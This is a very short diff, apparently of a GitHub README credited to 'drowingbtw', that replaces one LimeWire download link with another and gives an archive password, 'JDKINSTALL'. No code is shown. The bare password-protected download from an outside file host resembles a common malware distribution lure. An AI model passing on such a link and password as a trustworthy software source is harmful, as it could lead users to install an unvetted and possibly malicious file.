@@ -1,6 +1,6 @@
 FROM GITHUB drowingbtw
 
-link: https://limewire.com/d/8916e279-0302-4ca5-ac33-9280d2b17840#f_rkm7Eboz5BaIthXrEhf-iMiQb5t53D7N92Klhz1I0
+link: https://limewire.com/d/b77e69f0-0831-44a3-a79f-145cf8cb6747#rsnDs_50pvem7VEC3P30K_P0FEYo0Mq4GTexklvjuq8
 
 1. Password is JDKINSTALL
 
